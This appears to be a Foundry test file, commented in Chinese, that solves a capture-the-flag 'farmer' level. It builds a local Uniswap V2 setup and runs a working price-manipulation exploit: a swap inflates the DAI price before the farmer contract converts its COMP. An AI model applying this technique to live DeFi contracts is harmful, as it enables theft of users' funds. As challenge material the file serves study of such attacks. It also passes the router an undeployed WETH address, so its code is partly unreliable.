// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../../src/07.farmer/Setup.sol";
import "./tools/interface.sol";
import "./tools/helper_COMP.sol";
import "./tools/helper_DAI.sol";
import "./tools/factory.sol";
import "./tools/router.sol";

contract attackTest is Test {
    string constant weth9_Artifact = 'out/tools/helper_WETH9.sol/WETH9.json';

    Setup public level;

    // uniswapV2系统
    Iu_factory public u_factory;
    Iu_router public u_router;

    // 池子
    IPair public pair_compweth;
    IPair public pair_wethdai;

    // 代币
    IWETH9 public weth;
    DAI public dai;
    COMP public comp;

    function setUp() public {
        //////////////////初始化题目系统//////////////////////////

        // 部署u_factory
        u_factory = Iu_factory(deployHelper_u_factory());
        vm.label(address(u_factory), "u_factory");

        // 部署u_router
        u_router = Iu_router(deployHelper_u_router(address(u_factory), address(weth)));
        vm.label(address(u_router), "u_router");

        // 创建代币
        weth = IWETH9(deployHelper_weth(weth9_Artifact));
        vm.label(address(weth), "weth");
        dai = new DAI();
        comp = new COMP();

        // 懒得找谁要谁要授权谁了，反正swap之前要授权，乱授权算了，反正题目初始化和
        comp.approve(address(u_router), type(uint256).max);
        dai.approve(address(u_router), type(uint256).max);
        weth.approve(address(u_router), type(uint256).max);
        comp.approve(address(level), type(uint256).max);
        dai.approve(address(level), type(uint256).max);
        weth.approve(address(level), type(uint256).max);

        // 创建两个币对池子并添加流动性
        // Comp => WETH:  5:5
        pair_compweth = IPair(u_factory.createPair(address(comp), address(weth)));
        vm.label(address(pair_compweth), "pair_compweth");
        weth.deposit{value: 5 ether}();
        comp.transfer(address(pair_compweth), 5 ether);
        weth.transfer(address(pair_compweth), 5 ether);
        pair_compweth.mint(address(this));

        // WETH => DAI:  5:5
        pair_wethdai = IPair(u_factory.createPair(address(weth), address(dai)));
        vm.label(address(pair_wethdai), "pair_wethdai");
        weth.deposit{value: 5 ether}();
        weth.transfer(address(pair_wethdai), 5 ether);
        dai.transfer(address(pair_wethdai), 5 ether);
        pair_wethdai.mint(address(this));

        //////////////////初始化题目系统//////////////////////////

        level = new Setup{value: 50 ether}(address(comp), address(dai), address(0), address(u_router), address(weth));

    }

    function test_isComplete() public{
        // 我们用 0x5B38Da6a701c568545dCfcB03FcB875f56beddC4 进行攻击
        payable(0x5B38Da6a701c568545dCfcB03FcB875f56beddC4).transfer(2 ether);
        vm.startBroadcast(0x5B38Da6a701c568545dCfcB03FcB875f56beddC4);

        // 将 1ETH存入，换成 1WETH，用于swap，不能太少，否则swap不了
        weth.deposit{value: 1 ether}();
        CompDaiFarmer farmer = level.farmer();

        // 为swap做准备
        weth.approve(address(farmer), type(uint256).max);
        weth.approve(address(u_router), type(uint256).max);
        comp.approve(address(farmer), type(uint256).max);
        comp.approve(address(u_router), type(uint256).max);

        // swap: WETH => DAI, 抬高DAI价格
        address[] memory path = new address[](2);
        path[0] = address(weth);
        path[1] = address(dai);

        // 虽然我们是用0x5B38Da6a701c568545dCfcB03FcB875f56beddC4进行调用，
        // 但是在foundry的Broadcast中，msg.sender不是0x5B38Da6a701c568545dCfcB03FcB875f56beddC4，
        // 因此这里不能写msg.sender，而要硬编码自己的地址
        uint256 bal = weth.balanceOf(address(0x5B38Da6a701c568545dCfcB03FcB875f56beddC4));

        u_router.swapExactTokensForTokens(
            bal,
            0, 
            path,
            address(this), 
            type(uint256).max
        );

        // farmer拿走faucet的COMP
        farmer.claim();
        // farmer将本合约中的所有COMP换成DAI
        farmer.recycle();

        // 检查是否完成题目
        assertEq(level.isSolved(), true);

        vm.stopBroadcast();
    }

    function pairFor(address factory, address tokenA, address tokenB) internal pure returns (address pair) {
        (address token0, address token1) = sortTokens(tokenA, tokenB);
        
        pair = address(uint160(uint256(keccak256(abi.encodePacked(
                hex'ff',
                factory,
                keccak256(abi.encodePacked(token0, token1)),
                // 这个是我编译出来的bytecode的哈希值
                hex'f0e60e1779ec5ef88ad36bab3e3e0cad28189353ab5bf1f719a2855de1c74e52' // init code hash
            )))));
    }
    function sortTokens(address tokenA, address tokenB) internal pure returns (address token0, address token1) {
        require(tokenA != tokenB, 'UniswapV2Library: IDENTICAL_ADDRESSES');
        (token0, token1) = tokenA < tokenB ? (tokenA, tokenB) : (tokenB, tokenA);
        require(token0 != address(0), 'UniswapV2Library: ZERO_ADDRESS');
    }

    // 部署WETH
    function deployHelper_weth(string memory what) public returns (address addr) {
        bytes memory bytecode = vm.getCode(what);
        assembly {
            addr := create(0, add(bytecode, 0x20), mload(bytecode))
        }
    }

    // 部署u_factory
    function deployHelper_u_factory() public returns (address addr) {
        bytes memory bytecode = BYTECODE_factory;
        // 构造器有参数
        bytes memory bytecode_withConstructor = abi.encodePacked(bytecode, abi.encode(address(msg.sender)));
        assembly {
            addr := create(0, add(bytecode_withConstructor, 0x20), mload(bytecode_withConstructor))
        }
    }

    // 部署u_router
    function deployHelper_u_router(address _u_factory, address _weth) public returns (address addr) {
        bytes memory bytecode = BYTECODE_router;
        // 构造器有参数
        bytes memory bytecode_withConstructor = abi.encodePacked(bytecode, abi.encode(address(_u_factory), address(_weth)));
        assembly {
            addr := create(0, add(bytecode_withConstructor, 0x20), mload(bytecode_withConstructor))
        }
    }

}